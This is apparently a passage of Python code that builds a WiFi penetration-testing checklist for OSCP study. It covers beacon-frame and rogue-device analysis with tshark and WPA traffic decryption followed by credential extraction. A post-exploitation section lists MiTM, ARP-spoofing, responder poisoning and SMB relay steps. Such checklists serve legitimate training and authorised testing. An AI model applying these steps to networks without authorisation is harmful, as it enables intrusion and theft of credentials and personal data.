                'description': 'Check for covert data exfiltration in WiFi beacon frames (unusual data patterns)',
                'tags': ['OSCP:LOW', 'FORENSICS', 'STEALTH'],
                'flag_explanations': {
                    'tshark': 'Command-line Wireshark packet analyzer',
                    '-r': 'Read from pcap file',
                    '-Y': 'Display filter (Wireshark syntax)',
                    'wlan contains': 'Filter for WiFi frames containing string',
                    '-V': 'Verbose output (full packet details)',
                    'grep -i': 'Case-insensitive search for SSID/data fields'
                },
                'success_indicators': [
                    'Unusual data in SSID beacons',
                    'Suspicious strings in beacon frames',
                    'Encoded/hex data in network name'
                ],
                'failure_indicators': [
                    'Normal beacon frames only',
                    'No anomalous data patterns',
                    'Standard SSID broadcasts'
                ],
                'next_steps': [
                    'Wireshark filter: wlan.ssid == "NetworkName" for targeted analysis',
                    'Look for base64, hex encoding in SSID/beacons',
                    'Correlate with known exfiltration tools',
                    'Extract beacon data: tshark -r capture.pcap -Y wlan.fc.type_subtype==0x08 -T fields -e wlan.ssid'
                ],
                'alternatives': [
                    'Wireshark GUI: Filter "wlan contains <ESSID>" and inspect beacon frames',
                    'Manual: Wireless --> WLAN Traffic, look for unusual SSIDs',
                    'Search for specific patterns: wlan.ssid matches "regex"'
                ],
                'notes': 'Covert channels: Data can be exfiltrated in beacon SSIDs or information elements. Rare but documented in APT campaigns.'
            }
        })

        # 6.4: Identify Unknown MAC Addresses (Rogue Devices)
        pcap_analysis['children'].append({
            'id': f'unknown-mac-detect-{essid.replace(" ", "-")}',
            'name': 'Find Unknown/Rogue Devices in Network',
            'type': 'command',
            'metadata': {
                'command': f'tshark -r capture.pcap -Y "((wlan.ta == {bssid}) && !(wlan.fc == 0x8000)) && !(wlan.fc.type_subtype == 0x0005) && !(wlan.fc.type_subtype ==0x0004) && !(wlan.addr==ff:ff:ff:ff:ff:ff) && wlan.fc.type==2" -T fields -e wlan.addr',
                'description': 'Identify unknown MAC addresses communicating in WiFi network (potential rogue devices)',
                'tags': ['OSCP:MEDIUM', 'FORENSICS', 'RECON'],
                'flag_explanations': {
                    'wlan.ta': 'WiFi transmitter address (filter by AP BSSID)',
                    'wlan.fc': 'Frame control field',
                    '0x8000': 'Exclude beacon frames',
                    'wlan.fc.type_subtype': 'Frame type/subtype filter',
                    '0x0005': 'Exclude probe responses',
                    '0x0004': 'Exclude probe requests',
                    'ff:ff:ff:ff:ff:ff': 'Exclude broadcast MAC',
                    'wlan.fc.type==2': 'Data frames only (type 2)',
                    '-T fields': 'Output specific fields only',
                    '-e wlan.addr': 'Extract WiFi MAC address'
                },
                'success_indicators': [
                    'List of unique MAC addresses in network',
                    'Unknown devices identified',
                    'Rogue clients detected'
                ],
                'failure_indicators': [
                    'Only known/expected MACs visible',
                    'No data frames (only management)',
                    'Filter too restrictive (no results)'
                ],
                'next_steps': [
                    'Lookup MAC OUI: https://www.wireshark.org/tools/oui-lookup.html',
                    'Filter traffic by suspicious MAC: wlan.addr==<MAC> && (ftp || http || ssh || telnet)',
                    'Exclude known MACs: && !(wlan.addr==<KNOWN_MAC>)',
                    'Check for MiTM: Duplicate IPs with different MACs'
                ],
                'alternatives': [
                    'Wireshark: Statistics --> Endpoints --> WLAN tab (view all MACs)',
                    'Simpler filter: tshark -r capture.pcap -Y "wlan" -T fields -e wlan.sa | sort -u',
                    'GUI: Wireshark filter builder for complex expressions'
                ],
                'notes': 'OSCP: Identify unauthorized devices on enterprise WiFi. Look for MAC spoofing, rogue APs, evil twins.'
            }
        })

        # 6.5: Decrypt Captured WiFi Traffic (if PSK known)
        pcap_analysis['children'].append({
            'id': f'decrypt-wpa-traffic-{essid.replace(" ", "-")}',
            'name': 'Decrypt WPA Traffic with Known PSK',
            'type': 'manual',
            'metadata': {
                'description': 'Decrypt captured WPA/WPA2 traffic in Wireshark using recovered passphrase',
                'tags': ['OSCP:MEDIUM', 'FORENSICS', 'MANUAL'],
                'notes': [
                    'Prerequisites: PCAP with 4-way handshake + known WPA passphrase',
                    'Wireshark: Edit --> Preferences --> Protocols --> IEEE 802.11',
                    'Click "Edit" next to "Decryption keys"',
                    'Add Key Type: wpa-pwd, Key: password:SSID',
                    'Example: wpa-pwd:MyPassword123:HomeNetwork',
                    'Apply and reopen PCAP - encrypted frames now decrypted',
                    'Filter decrypted HTTP: http || http2',
                    'Extract credentials: Follow TCP Stream for cleartext protocols'
                ],
                'alternatives': [
                    'Command-line: tshark -r encrypted.pcap -o "wlan.enable_decryption:TRUE" -o "uat:80211_keys:\\"wpa-pwd\\",\\"password:SSID\\""',
                    'airdecap-ng: airdecap-ng -e ESSID -p password capture.pcap',
                    'Save decrypted: File --> Export Specified Packets'
                ],
                'next_steps': [
                    'Analyze decrypted traffic for credentials (FTP, HTTP, Telnet)',
                    'Extract files: File --> Export Objects --> HTTP/SMB/etc',
                    'Search for passwords: Edit --> Find Packet, String search',
                    'Check for sensitive data: PII, credit cards, API keys'
                ],
                'success_indicators': [
                    'Encrypted data frames become readable',
                    'HTTP/FTP/other protocols visible',
                    'Can follow TCP streams'
                ],
                'failure_indicators': [
                    'Handshake missing (cannot derive keys)',
                    'Wrong password entered',
                    'Capture uses WPA3 (different decryption)'
                ]
            }
        })

        tasks['children'].append(pcap_analysis)

        # ===== PHASE 7: POST-EXPLOITATION =====
        post_exploit = {
            'id': f'post-exploit-wifi-{essid.replace(" ", "-")}',
            'name': 'Post-Exploitation (After Access)',
            'type': 'parent',
            'children': []
        }

        # 6.1: LAN Attacks
        post_exploit['children'].append({
            'id': f'lan-attacks-{essid.replace(" ", "-")}',
            'name': 'LAN Enumeration & Attacks',
            'type': 'manual',
            'metadata': {
                'description': 'Once connected to WiFi, enumerate and attack internal network',
                'tags': ['OSCP:HIGH', 'POST_EXPLOIT'],
                'next_steps': [
                    'ARP scan: nmap -sn 192.168.1.0/24',
                    'Identify gateway: ip route show',
                    'MiTM attacks: bettercap, arpspoof, ettercap',
                    'Capture traffic: tcpdump, wireshark',
                    'LLMNR/NBT-NS poisoning: responder',
                    'SMB relay attacks if domain network',
                    'Check for open shares: smbclient, enum4linux'
                ],
                'notes': 'WiFi is just the entry point - pivot to full network compromise'
            }
        })

        tasks['children'].append(post_exploit)

        return tasks
